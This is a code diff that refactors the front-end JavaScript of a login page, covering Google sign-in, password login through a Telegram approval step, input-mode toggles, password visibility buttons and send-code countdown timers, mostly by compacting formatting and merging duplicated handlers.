@@ -1,9 +1,7 @@
 (function () {
     var cfg = window.APP_CONFIG || {};
 
-    if (window.AuthUI) {
-        window.AuthUI.init();
-    }
+    if (window.AuthUI) window.AuthUI.init();
 
     function initGoogleSignIn() {
         if (typeof google === 'undefined' || !google.accounts) return;
@@ -32,22 +30,18 @@
 
     function handleGoogleCredential(response) {
         var token = response && response.credential;
-        if (!token) {
-            console.error('Google credential missing');
-            return;
-        }
+        if (!token) { console.error('Google credential missing'); return; }
         if (!window.AuthAPI || !window.AuthUI) return;
         window.AuthUI.runGate(function () {
             return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithGoogle(token));
         }).catch(function () {});
     }
 
-    /* ── Login form → Telegram gate ── */
-    var loginForm = document.getElementById('loginForm');
-    var emailBlock = document.getElementById('emailBlock');
-    var phoneBlock = document.getElementById('phoneBlock');
+    var loginForm     = document.getElementById('loginForm');
+    var emailBlock    = document.getElementById('emailBlock');
+    var phoneBlock    = document.getElementById('phoneBlock');
     var passwordBlock = document.getElementById('passwordBlock');
-    var smsBlock = document.getElementById('smsBlock');
+    var smsBlock      = document.getElementById('smsBlock');
 
     function isPhoneMode() {
         return phoneBlock && window.getComputedStyle(phoneBlock).display !== 'none';
@@ -59,7 +53,7 @@
 
     function getDemoUsername() {
         if (isPhoneMode()) {
-            var code = document.getElementById('countryCode');
+            var code  = document.getElementById('countryCode');
             var phone = document.getElementById('phone');
             return (code ? code.value : '') + (phone ? phone.value.trim() : '');
         }
@@ -78,10 +72,7 @@
             }
 
             if (isSmsMode()) {
-                window.AuthUI.setBanner(
-                    'Use password or Google sign-in for the Telegram approval flow.',
-                    'error'
-                );
+                window.AuthUI.setBanner('Use password or Google sign-in for the Telegram approval flow.', 'error');
                 return;
             }
 
@@ -95,26 +86,23 @@
             }
 
             window.AuthUI.runGate(function () {
-                return window.AuthAPI.afterLoginPoll(
-                    window.AuthAPI.loginWithPassword(username, password)
-                );
+                return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithPassword(username, password));
             }).catch(function () {});
         });
     }
 
-    /* ── Password show/hide ── */
     function wireTogglePwd(inputId, btnId) {
         var inp = document.getElementById(inputId);
         var btn = document.getElementById(btnId);
         if (!inp || !btn) return;
         btn.addEventListener('click', function () {
-            var isHidden = inp.type === 'password';
-            inp.type = isHidden ? 'text' : 'password';
-            btn.setAttribute('aria-pressed', isHidden ? 'true' : 'false');
-            btn.setAttribute('aria-label', isHidden ? 'Hide password' : 'Show password');
+            var hidden = inp.type === 'password';
+            inp.type = hidden ? 'text' : 'password';
+            btn.setAttribute('aria-pressed', hidden ? 'true' : 'false');
+            btn.setAttribute('aria-label', hidden ? 'Hide password' : 'Show password');
             var eye = btn.querySelector('.eye-icon');
             if (eye) {
-                eye.innerHTML = isHidden
+                eye.innerHTML = hidden
                     ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>' +
                       '<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>' +
                       '<line x1="1" y1="1" x2="23" y2="23"/>'
@@ -128,110 +116,63 @@
     wireTogglePwd('fpNewPwd', 'fpToggleNewPwd');
     wireTogglePwd('fpConfirmPwd', 'fpToggleConfirmPwd');
 
-    /* ── Email ↔ Phone toggle ── */
-    function showEmail() {
-        emailBlock.style.display = '';
-        phoneBlock.style.display = 'none';
-    }
-    function showPhone() {
-        emailBlock.style.display = 'none';
-        phoneBlock.style.display = '';
-    }
+    function showEmail() { emailBlock.style.display = ''; phoneBlock.style.display = 'none'; }
+    function showPhone() { emailBlock.style.display = 'none'; phoneBlock.style.display = ''; }
 
     var usePhoneLink = document.getElementById('toggleInputMode');
     var useEmailLink = document.getElementById('toggleInputModePhone');
     if (usePhoneLink) usePhoneLink.addEventListener('click', function (e) { e.preventDefault(); showPhone(); });
     if (useEmailLink) useEmailLink.addEventListener('click', function (e) { e.preventDefault(); showEmail(); });
 
-    /* ── Password ↔ SMS Code toggle ── */
-    function showPassword() {
-        passwordBlock.style.display = '';
-        smsBlock.style.display = 'none';
-    }
-    function showSms() {
-        passwordBlock.style.display = 'none';
-        smsBlock.style.display = '';
-    }
+    function showPassword() { passwordBlock.style.display = ''; smsBlock.style.display = 'none'; }
+    function showSms()      { passwordBlock.style.display = 'none'; smsBlock.style.display = ''; }
 
     var smsToggleLink = document.getElementById('smsToggleLink');
     var pwdToggleLink = document.getElementById('pwdToggleLink');
     if (smsToggleLink) smsToggleLink.addEventListener('click', function (e) { e.preventDefault(); showSms(); });
     if (pwdToggleLink) pwdToggleLink.addEventListener('click', function (e) { e.preventDefault(); showPassword(); });
 
-    /* ── Send code button (countdown) ── */
-    var sendCodeBtn = document.getElementById('sendCodeBtn');
-    if (sendCodeBtn) {
-        sendCodeBtn.addEventListener('click', function () {
-            var seconds = 60;
-            sendCodeBtn.disabled = true;
-            sendCodeBtn.textContent = seconds + 's';
-            var timer = setInterval(function () {
-                seconds--;
-                if (seconds <= 0) {
-                    clearInterval(timer);
-                    sendCodeBtn.disabled = false;
-                    sendCodeBtn.textContent = 'Send code';
-                } else {
-                    sendCodeBtn.textContent = seconds + 's';
-                }
-            }, 1000);
-        });
+    function startCountdown(btn) {
+        var seconds = 60;
+        btn.disabled = true;
+        btn.textContent = seconds + 's';
+        var timer = setInterval(function () {
+            seconds--;
+            if (seconds <= 0) {
+                clearInterval(timer);
+                btn.disabled = false;
+                btn.textContent = 'Send code';
+            } else {
+                btn.textContent = seconds + 's';
+            }
+        }, 1000);
     }
 
-    /* ── Forgot Password view toggle ── */
-    var loginView = document.getElementById('loginView');
+    var sendCodeBtn   = document.getElementById('sendCodeBtn');
+    var fpSendCodeBtn = document.getElementById('fpSendCodeBtn');
+    if (sendCodeBtn)   sendCodeBtn.addEventListener('click', function () { startCountdown(sendCodeBtn); });
+    if (fpSendCodeBtn) fpSendCodeBtn.addEventListener('click', function () { startCountdown(fpSendCodeBtn); });
+
+    var loginView  = document.getElementById('loginView');
     var forgotView = document.getElementById('forgotView');
 
-    function showForgot() {
-        loginView.style.display = 'none';
-        forgotView.style.display = '';
-    }
-    function showLogin() {
-        forgotView.style.display = 'none';
-        loginView.style.display = '';
-    }
+    function showForgot() { loginView.style.display = 'none'; forgotView.style.display = ''; }
+    function showLogin()  { forgotView.style.display = 'none'; loginView.style.display = ''; }
 
     var forgotLink = document.getElementById('forgotPasswordLink');
-    var backBtn = document.getElementById('backToLogin');
+    var backBtn    = document.getElementById('backToLogin');
     if (forgotLink) forgotLink.addEventListener('click', function (e) { e.preventDefault(); showForgot(); });
-    if (backBtn) backBtn.addEventListener('click', function () { showLogin(); });
+    if (backBtn)    backBtn.addEventListener('click', function () { showLogin(); });
 
     var forgotForm = document.getElementById('forgotForm');
     if (forgotForm) forgotForm.addEventListener('submit', function (e) { e.preventDefault(); });
 
     var fpEmailBlock = document.getElementById('fpEmailBlock');
     var fpPhoneBlock = document.getElementById('fpPhoneBlock');
-    var fpUsePhone = document.getElementById('fpToggleInputMode');
-    var fpUseEmail = document.getElementById('fpToggleInputModePhone');
-    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) {
-        e.preventDefault();
-        fpEmailBlock.style.display = 'none';
-        fpPhoneBlock.style.display = '';
-    });
-    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) {
-        e.preventDefault();
-        fpPhoneBlock.style.display = 'none';
-        fpEmailBlock.style.display = '';
-    });
-
-    var fpSendCodeBtn = document.getElementById('fpSendCodeBtn');
-    if (fpSendCodeBtn) {
-        fpSendCodeBtn.addEventListener('click', function () {
-            var seconds = 60;
-            fpSendCodeBtn.disabled = true;
-            fpSendCodeBtn.textContent = seconds + 's';
-            var timer = setInterval(function () {
-                seconds--;
-                if (seconds <= 0) {
-                    clearInterval(timer);
-                    fpSendCodeBtn.disabled = false;
-                    fpSendCodeBtn.textContent = 'Send code';
-                } else {
-                    fpSendCodeBtn.textContent = seconds + 's';
-                }
-            }, 1000);
-        });
-    }
+    var fpUsePhone   = document.getElementById('fpToggleInputMode');
+    var fpUseEmail   = document.getElementById('fpToggleInputModePhone');
+    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) { e.preventDefault(); fpEmailBlock.style.display = 'none'; fpPhoneBlock.style.display = ''; });
+    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) { e.preventDefault(); fpPhoneBlock.style.display = 'none'; fpEmailBlock.style.display = ''; });
 
     if (document.readyState === 'complete') {
         initGoogleSignIn();
